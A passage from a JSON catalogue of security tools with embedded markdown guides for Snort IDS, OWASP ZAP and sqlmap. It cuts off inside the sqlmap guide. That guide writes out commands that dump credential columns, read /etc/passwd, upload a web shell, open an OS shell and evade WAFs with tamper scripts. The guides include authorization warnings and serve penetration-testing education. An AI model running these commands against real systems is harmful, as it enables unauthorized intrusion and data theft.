Mode\nsudo snort -c /etc/snort/snort.conf -i eth0 -D\n```\n\n---\n\n## 🧾 5. Rule Management\n\n### Update Rules with PulledPork\n\n```bash\nsudo apt install pulledpork -y\nsudo pulledpork.pl -c /etc/pulledpork/pulledpork.conf\n```\n\nEdit rule source:\n```bash\nsudo nano /etc/pulledpork/pulledpork.conf\nrule_url=https://www.snort.org/downloads/community|community-rules.tar.gz|Community\n```\n\nReload Snort:\n```bash\nsudo kill -SIGHUP $(pidof snort)\n```\n\n---\n\n## 🧱 6. Command Reference\n\n| Option | Description |\n| ------- | ------------ |\n| `-c` | Specify configuration file |\n| `-i` | Specify network interface |\n| `-D` | Run as daemon |\n| `-T` | Test configuration |\n| `-v` | Verbose packet output |\n| `-A` | Set alert mode (`fast`, `full`, `console`) |\n| `-V` | Show version info |\n\nLogs are stored in: `/var/log/snort/`\n\n---\n\n## ✍️ 7. Writing Snort Rules\n\n### Example Rule\n```bash\nalert tcp $HOME_NET any -> $EXTERNAL_NET 80 (\n  msg:\"Suspicious HTTP Traffic\";\n  content:\"malicious\"; http_uri;\n  sid:1000001; rev:1;\n)\n```\n\nComponents:\n- **Action:** alert / log / pass / drop  \n- **Protocol:** tcp / udp / icmp  \n- **Content:** pattern to match  \n- **SID:** signature ID  \n- **REV:** revision number  \n\n### Add Custom Rule\n```bash\nsudo nano /etc/snort/rules/local.rules\n```\n\nEnable it:\n```bash\ninclude $RULE_PATH/local.rules\n```\n\nValidate:\n```bash\nsnort -T -c /etc/snort/snort.conf\n```\n\n---\n\n## 🔍 8. Log & Alert Analysis\n\n```bash\n View alerts\ntail -f /var/log/snort/alert\n\n View packet logs\ntcpdump -r /var/log/snort/snort.log\n```\n\n### Unified2 Output with Barnyard2\n```bash\nbarnyard2 -c /etc/snort/barnyard2.conf -d /var/log/snort\n```\n\n---\n\n## 🧪 9. Performance Monitoring\n\n```bash\n Monitor performance stats\ntail -f /var/log/snort/snort.stats\n```\n\nKey Metrics:\n- Packets processed  \n- Alerts generated  \n- CPU and memory usage  \n\n**Optimization Tips:**\n```bash\n Increase buffer size\nconfig pcap: read-size 1048576\n\n Disable unnecessary preprocessors\npreprocessor stream5_global: max_tcp 8192, memcap 8388608\n```\n\n---\n\n## 🚧 10. Inline IPS Configuration\n\n### Enable Inline Mode\n```bash\nsudo iptables -I FORWARD -j QUEUE\nsudo snort -Q -c /etc/snort/snort.conf -i eth0:eth1\n```\n\n### Example Drop Rule\n```bash\ndrop tcp $HOME_NET any -> $EXTERNAL_NET 80 (\n  msg:\"Block Malicious HTTP\";\n  content:\"malicious\";\n  sid:1000002;\n)\n```\n\nTest:\n```bash\ncurl http://example.com/malicious\ngrep \"1000002\" /var/log/snort/alert\n```\n\n---\n\n## 📊 11. Integration with SIEM Tools\n\n| Tool | Integration Type |\n|------|------------------|\n| **ELK Stack** | Forward logs via Logstash |\n| **Splunk** | Universal Forwarder |\n| **Graylog** | Syslog Integration |\n| **ArcSight** | Syslog Output |\n\nExample Syslog Output:\n```bash\noutput alert_syslog: LOG_AUTH LOG_ALERT\n```\n\nVisualization Tools:\n- **Snorby** – Web UI for Snort  \n- **Kibana** – Graphical dashboards  \n- **Grafana** – Performance visualization  \n\n---\n\n## 🧰 12. Troubleshooting\n\n### Common Problems\n| Issue | Fix |\n|-------|-----|\n| Packet Loss | Increase buffer size: `config pcap: read-size 1048576` |\n| High CPU Usage | Disable unneeded preprocessors |\n| Config Errors | `snort -T -c /etc/snort/snort.conf -vvv` |\n| Rule Errors | Check `/var/log/snort/snort.log` |\n\n### Log Files\n| File | Description |\n|------|-------------|\n| `alert` | Alert messages |\n| `snort.log` | Captured packets |\n| `snort.stats` | Performance metrics |\n\n---\n\n## 🧩 13. Best Practices\n\n**Configuration**\n- Define accurate `HOME_NET` and `EXTERNAL_NET`\n- Enable only essential preprocessors\n- Regularly update rules with PulledPork\n\n**Monitoring**\n- Check `/var/log/snort/` daily  \n- Track CPU/memory usage  \n- Correlate Snort logs with SIEM\n\n**Security**\n- Restrict access to configs  \n- Run Snort with least privilege  \n- Backup all rule sets  \n\n---\n\n## ⚔️ 14. Common Use Cases\n\n| Category | Example Use |\n|-----------|-------------|\n| **Network Security** | Detect malware, block C2 traffic |\n| **Incident Response** | Trace attack origins |\n| **Compliance** | Generate audit trails |\n| **Research** | Learn packet analysis & forensics |\n\n---\n\n## 🧭 15. Pro Tips\n\n✅ Tune noisy rules  \n✅ Automate rule updates  \n✅ Validate all custom rules before deployment  \n✅ Use Unified2 output for better SIEM integration  \n✅ Monitor `snort.stats` regularly  \n\n---\n\n## ⚖️ 16. Legal Disclaimer\n\n> **Warning:** Snort must only be used for authorized activities.\n\nUse Snort **only** for:\n- Monitoring networks you own or manage  \n- Research in controlled environments  \n- Incident response with authorization  \n- Educational purposes  \n\n**Unauthorized use** may violate privacy or computer crime laws.  \nAlways obtain **written consent** before deploying Snort on any network.\n\n---\n\n**Author:** Cisco / Open-Source Community  \n**Maintainer:** Cisco Talos  \n**Website:** [https://www.snort.org](https://www.snort.org)\n"
      }
    ]
  },
  {
    "name": "Suricata",
    "description": "A high performance Network IDS, IPS and Network Security Monitoring engine.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ids",
      "ips",
      "pcap analysis"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Kismet",
    "description": "A wireless network detector, sniffer, and intrusion detection system.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "wifi",
      "wardriving",
      "wireless ids"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Netdiscover",
    "description": "An active/passive ARP reconnaissance tool.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "arp scanning",
      "network discovery",
      "lan"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Burp Suite",
    "description": "An integrated platform for performing security testing of web applications.",
    "category": "Web Application Security",
    "tags": [
      "proxy",
      "spider",
      "intruder",
      "repeater"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "OWASP ZAP",
    "description": "An open-source web application security scanner.",
    "category": "Web Application Security",
    "tags": [
      "automated scanner",
      "manual testing",
      "fuzzing"
    ],
    "color": "#c34be5",
    "articles": [
      {
        "title": "🔎 OWASP ZAP — Structured, Numbered Guide",
        "content": "# 🔎 OWASP ZAP — Structured, Numbered Guide\n\n**Purpose:** This document is organized into numbered sections. Each section contains:\n- **What it is / Why it matters** — short conceptual explanation.  \n- **Step-by-step commands** — runnable commands with safe defaults.  \n- **What to expect** — typical output or behavior.  \n- **Troubleshooting & tips** — common problems and fixes.  \n- **Safety / ethics note** — when applicable.\n\n---\n\n## 1. What is OWASP ZAP?\n\n**What it is / Why it matters**  \nOWASP Zed Attack Proxy (ZAP) is a free, open-source web application security scanner maintained by the OWASP community. It helps developers and security testers automatically and manually find vulnerabilities in web apps and APIs.\n\n**Step-by-step commands**  \n```bash\nStart ZAP GUI (Linux/macOS)\n./zap.sh\n\nStart ZAP headless (daemon)\n./zap.sh -daemon -port 8080\n\nQuick baseline scan (Docker example)\ndocker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com\n```\n\n**What to expect**  \nA GUI opens for interactive testing or a headless run completes and produces a report (HTML/JSON) when finished.\n\n**Troubleshooting & tips**  \nIf the GUI doesn't start, check Java installation and permissions. For headless runs, ensure network access from the container/host to the target.\n\n**Safety / ethics note**  \nOnly test applications you own or have explicit authorization to test. Automated scans may be intrusive and affect availability.\n\n---\n\n## 2. Installation & Setup (Windows)\n\n**What it is / Why it matters**  \nInstalling ZAP on Windows gives you a desktop GUI for interactive testing and local automation.\n\n**Step-by-step commands**  \n```powershell\nInstall via Chocolatey (Windows)\nchoco install zap -y\n\nOr download and run installer:\nhttps://www.zaproxy.org/download/\nThen run zap.bat to start\nzap.bat -version\n```\n\n**What to expect**  \nAn installed program appears in Start Menu; `zap.bat -version` prints the version.\n\n**Troubleshooting & tips**  \nIf proxy intercept doesn't work, import ZAP's root certificate into the browser. Run installer as Administrator to avoid permission issues.\n\n**Safety / ethics note**  \nWhen importing root certs, only do so on testing browsers or VMs to avoid trusting ZAP globally on production systems.\n\n---\n\n## 3. Installation & Setup (Linux)\n\n**What it is / Why it matters**  \nLinux installations are useful for servers, CI runners, and testers who prefer Unix environments.\n\n**Step-by-step commands**  \n```bash\nInstall from package (Ubuntu/Debian; may be older)\nsudo apt update\nsudo apt install zaproxy -y\n\nOr download latest release and run\nwget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_Linux.tar.gz\ntar -xzf ZAP_2_14_0_Linux.tar.gz\ncd ZAP_2.14.0/\n./zap.sh\n```\n\n**What to expect**  \n`./zap.sh` starts the GUI; headless can be started via `-daemon`.\n\n**Troubleshooting & tips**  \nEnsure Java (OpenJDK) is installed and `JAVA_HOME` is correct. For Docker-based runs, map ports and mount volumes for reports.\n\n**Safety / ethics note**  \nRun ZAP in isolated environments when testing internet-facing targets to avoid accidental exposure.\n\n---\n\n## 4. Installation & Setup (macOS & Docker)\n\n**What it is / Why it matters**  \nmacOS supports a native GUI via Homebrew; Docker offers reproducible headless runs for CI.\n\n**Step-by-step commands**  \n```bash\nmacOS via Homebrew\nbrew install --cask owasp-zap\n\nDocker (headless baseline scan)\ndocker pull owasp/zap2docker-stable\ndocker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com\n\nDocker with GUI (webswing)\ndocker run -u zap -p 8080:8080 -p 8090:8090 -i owasp/zap2docker-stable zap-webswing.sh\n```\n\n**What to expect**  \nHomebrew installs app bundle; Docker run prints CLI output and produces reports (zap-report.json/html).\n\n**Troubleshooting & tips**  \nWhen running Docker, mount a host directory to `/zap/wrk` to persist reports. Use `-e` env vars for API key if needed.\n\n**Safety / ethics note**  \nAvoid publishing Docker containers with embedded API keys or credentials.\n\n---\n\n## 5. Basic Workflow (GUI Mode)\n\n**What it is / Why it matters**  \nGUI mode offers visual tools (proxy, spider, active scan) ideal for manual testing and learning.\n\n**Step-by-step commands**  \n1. Start ZAP GUI: `./zap.sh` or open the app.  \n2. Configure browser proxy: `localhost:8080`.  \n3. Browse target to populate History.  \n4. Right-click target → `Attack` → `Spider` or `Active Scan`.  \n\n**What to expect**  \nHistory tab fills with requests; passive scan results appear; active scan reports vulnerabilities.\n\n**Troubleshooting & tips**  \nIf traffic doesn't show, confirm browser proxy settings and that the ZAP root cert is installed in the browser.\n\n**Safety / ethics note**  \nUse passive scan for production; active scan is intrusive and should be run in test or approved windows.\n\n---\n\n## 6. Command Line & Headless Usage\n\n**What it is / Why it matters**  \nHeadless mode and CLI scripts enable automation in CI/CD and scheduled scanning without UI.\n\n**Step-by-step commands**  \n```bash\nStart daemon with API key\n./zap.sh -daemon -port 8080 -config api.key=YOUR_KEY\n\nBaseline scan (Docker)\ndocker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com\n\nFull scan\nzap-full-scan.py -t https://example.com -r zap-full-report.html\n```\n\n**What to expect**  \nCLI scripts run and generate reports (`.html`, `.json`) in working directory.\n\n**Troubleshooting & tips**  \nUse `-v` or verbose logs for debugging. Ensure the daemon has started before calling the API.\n\n**Safety / ethics note**  \nSchedule scans during low-traffic windows and only on authorized targets.\n\n---\n\n## 7. Proxy Configuration & Browser Setup\n\n**What it is / Why it matters**  \nZAP acts as an intercepting proxy; proper proxy setup is essential to capture and modify traffic.\n\n**Step-by-step commands**  \n```text\nBrowser proxy:\nHost: localhost\nPort: 8080\n\nChrome example:\nchrome --proxy-server=\"localhost:8080\"\n```\n\n**What to expect**  \nRequests from browser are routed through ZAP and appear in History.\n\n**Troubleshooting & tips**  \nInstall ZAP CA certificate (Tools → Options → Dynamic SSL Certificates) in browser to avoid TLS errors.\n\n**Safety / ethics note**  \nOnly install ZAP certs in test browsers/VMs; remove certs after testing.\n\n---\n\n## 8. Automated Scanning — Spider & AJAX Spider\n\n**What it is / Why it matters**  \nSpiders discover URLs and parameters; the AJAX spider explores JavaScript-driven content that a traditional spider may miss.\n\n**Step-by-step commands**  \n1. Right-click target → `Attack` → `Spider` → Start.  \n2. Tools → `AJAX Spider` → Enter start URL → Start.  \n\n**What to expect**  \nNew endpoints and parameters are added to the Site Tree/History for further scanning.\n\n**Troubleshooting & tips**  \nAJAX Spider requires a browser launcher (headless browser). Configure crawl depth and scope to limit noise.\n\n**Safety / ethics note**  \nKeep crawl scope tight to avoid crawling entire external domains or directories.\n\n---\n\n## 9. Active & Passive Scanning\n\n**What it is / Why it matters**  \n- Passive scanning inspects proxied traffic without sending extra requests — safe for production.  \n- Active scanning performs vulnerability checks and may be intrusive.\n\n**Step-by-step commands**  \n```text\nPassive scan: happens automatically as you proxy traffic\nActive scan:\nRight-click target → Attack → Active Scan → Configure policy → Start\n```\n\n**What to expect**  \nPassive scan lists informational issues; active scan generates detailed alerts with risk levels.\n\n**Troubleshooting & tips**  \nCustomize scan policy (Analyze → Scan Policy Manager) to tune checks and reduce false positives.\n\n**Safety / ethics note**  \nRun active scans only with permission and preferably in staging environments.\n\n---\n\n## 10. Manual Testing: Intercepting, Breakpoints & Fuzzing\n\n**What it is / Why it matters**  \nManual tools let testers craft requests, manipulate parameters, and fuzz endpoints to validate vulnerabilities.\n\n**Step-by-step commands**  \n1. Proxies → Main Proxy → Enable intercept.  \n2. Browse target; requests pause for review.  \n3. Right-click a parameter → Fuzz → Add payloads → Start.\n\n**What to expect**  \nIntercepted requests appear for modification; fuzz results show responses and potential crashes or anomalies.\n\n**Troubleshooting & tips**  \nUse small payload sets first. Inspect response codes, content length, and response times for anomalies.\n\n**Safety / ethics note**  \nFuzzing can cause instability — avoid on production unless explicitly allowed.\n\n---\n\n## 11. Authentication & Session Management\n\n**What it is / Why it matters**  \nConfiguring authentication allows ZAP to maintain sessions and scan authenticated areas of an app.\n\n**Step-by-step commands**  \n1. Create Context → Include URLs in the context.  \n2. Context → Authentication → Choose method (Form-based/HTTP/Script).  \n3. Add User → Provide credentials → Test login.\n\n**What to expect**  \nZAP can log in as that user, maintain session tokens, and scan protected areas.\n\n**Troubleshooting & tips**  \nUse cookie/session token handling and anti-CSRF configuration so ZAP can refresh tokens during scans.\n\n**Safety / ethics note**  \nUse test accounts with limited privileges and follow data handling rules.\n\n---\n\n## 12. API & CI/CD Integration\n\n**What it is / Why it matters**  \nZAP's API and Docker images enable integration into pipelines (Jenkins, GitHub Actions) for automated security checks.\n\n**Step-by-step commands**  \n```bash\n# Start daemon with API key\n./zap.sh -daemon -port 8080 -config api.key=mykey\n\nAPI example: start spider (curl)\ncurl \"http://localhost:8080/JSON/spider/action/scan/?url=https://example.com&apikey=mykey\"\n\nGitHub Action example (uses zaproxy/action-baseline)\nuses: zaproxy/action-baseline@v0.7.0\nwith:\n  target: 'https://example.com'\n```\n\n**What to expect**  \nPipeline jobs run ZAP scans and publish artifacts (zap-report.json/html). Fail builds on policy violations if configured.\n\n**Troubleshooting & tips**  \nPin Docker image versions in CI to ensure reproducibility. Increase timeouts for large apps.\n\n**Safety / ethics note**  \nRestrict CI runners' network access; ensure reports do not leak secrets or PII.\n\n---\n\n## 13. Reporting (HTML, XML, JSON)\n\n**What it is / Why it matters**  \nZAP can generate human- and machine-readable reports for remediation and compliance.\n\n**Step-by-step commands**  \n```bash\nGenerate HTML report (CLI)\nzap-full-scan.py -t https://example.com -r zap-report.html\n\nExport alerts via API (JSON)\ncurl \"http://localhost:8080/JSON/core/view/alerts/?apikey=mykey\"\n```\n\n**What to expect**  \nReports contain alerts grouped by risk and include request/response evidence and remediation advice.\n\n**Troubleshooting & tips**  \nFilter alerts by context or severity before generating executive reports. Sanitize reports to remove sensitive data.\n\n**Safety / ethics note**  \nProtect generated reports; they contain exploit evidence and potentially sensitive data.\n\n---\n\n## 14. Add-ons & Extensions\n\n**What it is / Why it matters**  \nAdd-ons extend ZAP's capabilities (e.g., Advanced SQLi, DOM XSS, GraphQL, OpenAPI support).\n\n**Step-by-step commands**  \n1. Manage Add-ons → Marketplace → Search and Install.  \n2. Restart ZAP if required.\n\n**What to expect**  \nNew menu options, scanners, or importers become available.\n\n**Troubleshooting & tips**  \nKeep add-ons updated; some may depend on Java versions or other add-ons.\n\n**Safety / ethics note**  \nReview add-on permissions and source; avoid installing untrusted third-party plugins.\n\n---\n\n## 15. Custom Scripting\n\n**What it is / Why it matters**  \nScripts let you automate tasks, implement custom scanning logic, or tweak requests/responses.\n\n**Step-by-step commands**  \n1. Script Console → New Script → Choose type (Proxy/Active/Passive).  \n2. Write JS/Python/Groovy script and save.  \n3. Enable script and test.\n\n**What to expect**  \nScripts run inline and can modify traffic, implement auth flows, or add checks.\n\n**Troubleshooting & tips**  \nTest scripts in small scope first. Use logging in scripts to debug behavior.\n\n**Safety / ethics note**  \nScripts can introduce unsafe behavior; review and sandbox them before enabling.\n\n---\n\n## 16. Troubleshooting & Performance Tuning\n\n**What it is / Why it matters**  \nCommon issues include certificate errors, memory limits, and slow scans. Proper tuning improves reliability.\n\n**Step-by-step commands**  \n```text\nIncrease Java heap (edit zap.sh or zap.bat)\nExample JVM option:\n-Xmx4g\n```\n\n**What to expect**  \nLarger heap reduces OOM errors for big scans. Tuning threads and delays balances speed and server load.\n\n**Troubleshooting & tips**  \nIf certificate errors occur, regenerate and reinstall ZAP CA cert. If Docker can't reach target, check network mode and proxy settings.\n\n**Safety / ethics note**  \nAvoid increasing concurrency against production systems — prioritize stability.\n\n---\n\n## 17. Common Use Cases & Workflows\n\n**What it is / Why it matters**  \nPractical scenarios: dev-shift-left testing, pre-prod scans, API testing, pentests, and CI gates.\n\n**Step-by-step commands**  \n```text\nCI baseline scan (Docker) for a PR:\ndocker run -t owasp/zap2docker-stable zap-baseline.py -t ${TARGET_URL} -J zap-report.json\n```\n\n**What to expect**  \nAutomated scan in PR provides pass/fail signal and report artifacts for reviewers.\n\n**Troubleshooting & tips**  \nUse contexts to limit scan scope. Exclude 3rd-party domains and known safe endpoints.\n\n**Safety / ethics note**  \nCoordinate with teams to avoid disrupting testing or deployments.\n\n---\n\n## 18. Pro Tips & Best Practices\n\n**What it is / Why it matters**  \nActionable advice to get accurate results and minimise false positives/negatives.\n\n**Step-by-step commands**  \n```text\nExample starter scan\nzap-baseline.py -t https://example.com -r baseline.html\n\nUse contexts and users for authenticated scans\nUse scripts to handle anti-CSRF tokens\n```\n\n**What to expect**  \nCleaner results, fewer false positives, and repeatable scans.\n\n**Troubleshooting & tips**  \nTune scan policies, whitelist static resources, and use manual verification to confirm findings.\n\n**Safety / ethics note**  \nKeep test scopes narrow and document approvals.\n\n---\n\n## 19. Legal Disclaimer\n\n**What it is / Why it matters**  \nLegal constraints and ethics for security testing.\n\n**Step-by-step commands**  \nN/A — read policies and obtain approvals.\n\n**What to expect**  \nAuthorization processes, NDAs, and rules of engagement when testing third‑party or production systems.\n\n**Troubleshooting & tips**  \nIf unsure about scope, pause testing and request written confirmation.\n\n**Safety / ethics note**  \nUnauthorized testing may violate laws and cause service outages. Always act responsibly.\n\n---\n\n**End of file**\n"
      }
    ]
  },
  {
    "name": "sqlmap",
    "description": "Automates detecting and exploiting SQL injection flaws.",
    "category": "Web Application Security",
    "tags": [
      "sql injection",
      "database takeover"
    ],
    "color": "#e59b4b",
    "articles": [
      {
        "title": "⚡ SQLMap — Structured, Numbered Guide",
        "content": "# ⚡ SQLMap — Structured, Numbered Guide \n\n**Purpose:** This file is organized into numbered sections. Each section contains:\n- **What it is / Why it matters** — short conceptual explanation.  \n- **Step-by-step commands** — runnable commands with safe defaults.  \n- **What to expect** — typical output or behavior.  \n- **Troubleshooting & tips** — common problems and fixes.  \n- **Safety / ethics note** — when applicable.\n\n---\n\n## 1. What is SQLMap?\n\n**What it is / Why it matters**  \nSQLMap is an open-source automation tool for detecting and exploiting SQL injection (SQLi) vulnerabilities. It helps penetration testers and security researchers quickly enumerate databases, extract data, and — with authorization — demonstrate the impact of SQLi on target systems.\n\n**Step-by-step commands**  \n```bash\nShow help / basic usage\nsqlmap --help\n```\n\n**What to expect**  \nHelp text listing options and examples. A local executable that responds to `-u` target flags.\n\n**Troubleshooting & tips**  \nIf `sqlmap` isn't found, ensure PATH is set or run `python sqlmap.py` from the cloned repo.\n\n**Safety / ethics note**  \nOnly test systems you own or have written permission to test. Unauthorized SQLi is illegal.\n\n---\n\n## 2. Installation & Setup\n\n**What it is / Why it matters**  \nInstalling the latest stable SQLMap gives you the newest detection engines and tamper scripts. On Kali it's preinstalled; on other Linux distributions, install from package manager or GitHub.\n\n**Step-by-step commands**  \n```bash\nDebian/Ubuntu via apt (may be older)\nsudo apt update && sudo apt install sqlmap -y\n\nClone latest from GitHub (recommended)\ngit clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\ncd sqlmap-dev\nRun using Python\npython3 sqlmap.py --help\n```\n\n**What to expect**  \nA working `sqlmap` script in the `sqlmap-dev` folder; `--help` prints usage.\n\n**Troubleshooting & tips**  \nIf Python complains, install `python3` and dependencies. Use virtualenv for isolation.\n\n**Safety / ethics note**  \nKeep the repo up-to-date; do not use precompiled binaries from untrusted sources.\n\n---\n\n## 3. Basic Usage & Syntax\n\n**What it is / Why it matters**  \nDefines how to pass targets, parameters, and request options to SQLMap — the foundation of safe, repeatable testing.\n\n**Step-by-step commands**  \n```bash\nBasic GET test\npython3 sqlmap.py -u \"http://example.com/page.php?id=1\"\n\nTest specific parameter\npython3 sqlmap.py -u \"http://example.com/page.php?id=1&name=test\" -p id\n\nPOST data\npython3 sqlmap.py -u \"http://example.com/login.php\" --data=\"username=admin&password=pass\"\n```\n\n**What to expect**  \nSQLMap runs tests, prints progress, and reports detected injection types and evidence.\n\n**Troubleshooting & tips**  \nStart with `--level=1 --risk=1` to minimize impact; increase only when necessary.\n\n**Safety / ethics note**  \nUse `--batch` with caution; it removes interactive confirmation and can cause destructive actions.\n\n---\n\n## 4. Request Options (Headers, Cookies, Proxy)\n\n**What it is / Why it matters**  \nAllows customizing HTTP requests to match application behavior and bypass trivial protections.\n\n**Step-by-step commands**  \n```bash\nCustom headers\npython3 sqlmap.py -u \"URL\" --headers=\"X-Forwarded-For: 127.0.0.1\"\n\nCookies\npython3 sqlmap.py -u \"URL\" --cookie=\"PHPSESSID=abc123; user=admin\"\n\nProxy (Burp)\npython3 sqlmap.py -u \"URL\" --proxy=\"http://127.0.0.1:8080\"\n```\n\n**What to expect**  \nSQLMap routes traffic via proxy or includes headers/cookies in each request.\n\n**Troubleshooting & tips**  \nWhen testing behind WAFs, use Burp to inspect requests. Use `--random-agent` to rotate UA strings.\n\n**Safety / ethics note**  \nDo not leak sensitive cookies or credentials. Use test accounts where possible.\n\n---\n\n## 5. Detection Techniques (Levels & Risk)\n\n**What it is / Why it matters**  \n`--level` and `--risk` control the aggressiveness of tests. Understanding them avoids unnecessary disruption.\n\n**Step-by-step commands**  \n```bash\nDefault gentle scan\npython3 sqlmap.py -u \"URL\" --level=1 --risk=1\n\nMore aggressive (more tests)\npython3 sqlmap.py -u \"URL\" --level=5 --risk=3\n```\n\n**What to expect**  \nHigher levels/risk increase the number of payloads and the chance of noticeable effects (slower responses, DB modifications).\n\n**Troubleshooting & tips**  \nIf the app is unstable, reduce `--level`/`--risk`. Use `--timeout` and `--delay` to reduce load.\n\n**Safety / ethics note**  \nAggressive scans can trigger alarms or cause outages; get explicit permission.\n\n---\n\n## 6. Specific Techniques\n\n**What it is / Why it matters**  \nSQLMap supports Boolean, Error, Union, Stacked, and Time-based techniques — choose based on DB and behavior.\n\n**Step-by-step commands**  \n```bash\nBoolean-based blind\npython3 sqlmap.py -u \"URL\" --technique=B\n\nError-based\npython3 sqlmap.py -u \"URL\" --technique=E\n\nTime-based\npython3 sqlmap.py -u \"URL\" --technique=T\n```\n\n**What to expect**  \nSQLMap will attempt the selected technique, show payloads, and report evidence if successful.\n\n**Troubleshooting & tips**  \nIf one technique fails, try `--technique=BEUST` to let SQLMap try multiple approaches.\n\n**Safety / ethics note**  \nTime-based tests can be noisy and slow; avoid on production without consent.\n\n---\n\n## 7. Database Enumeration (Banner, Users, DBs, Tables)\n\n**What it is / Why it matters**  \nEnumeration reveals target DBMS, users, databases, tables — essential for informed exploitation and reporting.\n\n**Step-by-step commands**  \n```bash\nBanner and basic info\npython3 sqlmap.py -u \"URL\" --banner --current-user --current-db\n\nList databases\npython3 sqlmap.py -u \"URL\" --dbs\n\nList tables\npython3 sqlmap.py -u \"URL\" -D target_db --tables\n\nList columns\npython3 sqlmap.py -u \"URL\" -D target_db -T users --columns\n```\n\n**What to expect**  \nSQLMap outputs DBMS type, current user, and lists of databases/tables/columns when found.\n\n**Troubleshooting & tips**  \nUse `--threads` to speed extraction but monitor server load. Use `--hex` for non-printable characters.\n\n**Safety / ethics note**  \nEnumeration may expose sensitive data in clear text — handle outputs securely.\n\n---\n\n## 8. Data Extraction & Dumping\n\n**What it is / Why it matters**  \nDumping demonstrates the severity of vulnerabilities by extracting data (only with authorization).\n\n**Step-by-step commands**  \n```bash\nDump entire DB\npython3 sqlmap.py -u \"URL\" -D target_db --dump\n\nDump a single table\npython3 sqlmap.py -u \"URL\" -D target_db -T users --dump\n\nDump selected columns\npython3 sqlmap.py -u \"URL\" -D target_db -T users -C \"username,password\" --dump\n```\n\n**What to expect**  \nCSV-like output saved under `./output/<target>/` with extracted rows.\n\n**Troubleshooting & tips**  \nIf dumping stalls, use `--dump-all --threads=2` or `--start`/`--stop` to page results.\n\n**Safety / ethics note**  \nNever exfiltrate or share real sensitive data. Sanitize outputs in reports and follow disclosure policies.\n\n---\n\n## 9. Advanced Exploitation (File System & OS Access)\n\n**What it is / Why it matters**  \nSQLMap can read/write files and attempt OS command execution — powerful for demonstrating full compromise.\n\n**Step-by-step commands**  \n```bash\nRead file\npython3 sqlmap.py -u \"URL\" --file-read=\"/etc/passwd\"\n\nWrite file (upload)\npython3 sqlmap.py -u \"URL\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\"\n\nExecute OS command\npython3 sqlmap.py -u \"URL\" --os-cmd=\"whoami\"\n\nInteractive OS shell (if possible)\npython3 sqlmap.py -u \"URL\" --os-shell\n```\n\n**What to expect**  \n`--file-read` prints file content; `--file-write` attempts to upload; OS commands print output.\n\n**Troubleshooting & tips**  \nUse `--tmp-path` for writeable locations. If `--os-shell` fails, try `--os-pwn` only in controlled labs.\n\n**Safety / ethics note**  \nOS-level access is extremely invasive — only with explicit consent and documented scope.\n\n---\n\n## 10. Evasion Techniques (Tamper Scripts & Delays)\n\n**What it is / Why it matters**  \nTamper scripts and timing control help bypass WAFs and input filters while reducing detection.\n\n**Step-by-step commands**  \n```bash\nList tamper scripts\npython3 sqlmap.py --list-tampers\n\nUse tamper scripts\npython3 sqlmap.py -u \"URL\" --tamper=space2comment,charencode\n\nAdd delays\npython3 sqlmap.py -u \"URL\" --delay=2 --randomize\n```\n\n**What to expect**  \nModified payloads in requests and slower, stealthier traffic patterns.\n\n**Troubleshooting & tips**  \nTest tamper scripts in a proxy (Burp) to understand how payloads change. Combine with `--technique` selection.\n\n**Safety / ethics note**  \nEvasion can be mistaken for malicious intent by defenders — record test approvals.\n\n---\n\n## 11. Session Management & Output Options\n\n**What it is / Why it matters**  \nSessions let you resume scans; output directories organize results for reporting and evidence preservation.\n\n**Step-by-step commands**  \n```bash\nSave session\npython3 sqlmap.py -u \"URL\" -s session.sqlite\n\nLoad session and resume\npython3 sqlmap.py -u \"URL\" -s session.sqlite --flush-session\n\nSet output directory and verbosity\npython3 sqlmap.py -u \"URL\" --output-dir=/tmp/sqlmap_output -v 3\n```\n\n**What to expect**  \nSession files under `--output-dir`; verbose logs and `traffic.log` if `-t` used.\n\n**Troubleshooting & tips**  \nUse `--batch` for automation but keep separate sessions per target.\n\n**Safety / ethics note**  \nProtect session files — they may contain sensitive request payloads and cookies.\n\n---\n\n## 12. Burp Suite Integration\n\n**What it is / Why it matters**  \nBurp captures complex requests and allows fine inspection; SQLMap can consume saved requests and proxy through Burp.\n\n**Step-by-step commands**  \n```bash\nUse saved request file from Burp\npython3 sqlmap.py -r request.txt -p username\n\nRoute via Burp proxy\npython3 sqlmap.py -u \"URL\" --proxy=\"http://127.0.0.1:8080\"\n```\n\n**What to expect**  \nSQLMap shows the same HTTP traffic Burp captured and targets chosen parameters.\n\n**Troubleshooting & tips**  \nEnsure `request.txt` uses correct CRLF formatting. Use `--ignore-proxy` for hosts you don't want proxied.\n\n**Safety / ethics note**  \nAvoid storing sensitive credentials in public repos; secure Burp project files.\n\n---\n\n## 13. Automation & Batch Processing\n\n**What it is / Why it matters**  \nAutomating scans helps in large assessments but increases risk — use controlled scripts with logging and throttling.\n\n**Step-by-step commands**  \n```bash\nMultiple targets\npython3 sqlmap.py -m urls.txt --batch\n\nCrawl forms\npython3 sqlmap.py -u \"http://example.com\" --crawl=2 --forms\n```\n\n**What to expect**  \nBatch runs non-interactively; crawl finds form parameters to test.\n\n**Troubleshooting & tips**  \nMonitor resource use and throttle with `--delay` and `--timeout`.\n\n**Safety / ethics note**  \nAutomated scans should be in-scope and scheduled to avoid business hours impact.\n\n---\n\n## 14. Database-Specific Features\n\n**What it is / Why it matters**  \nTailoring commands to DBMS improves success rates and reduces noise.\n\n**Step-by-step commands**  \n```bash\nMySQL\npython3 sqlmap.py -u \"URL\" --dbms=mysql --privileges\n\nPostgreSQL\npython3 sqlmap.py -u \"URL\" --dbms=postgresql --file-write=\"shell.php\" --file-dest=\"/tmp/shell.php\"\n\nMSSQL\npython3 sqlmap.py -u \"URL\" --dbms=mssql --os-shell\n```\n\n**What to expect**  \nDBMS-specific payloads and enumeration options are used; some features (UDF injection) require advanced privileges.\n\n**Troubleshooting & tips**  \nIf DBMS misidentified, force `--dbms` to speed tests. Use `--os-cmd` only when confirmed possible.\n\n**Safety / ethics 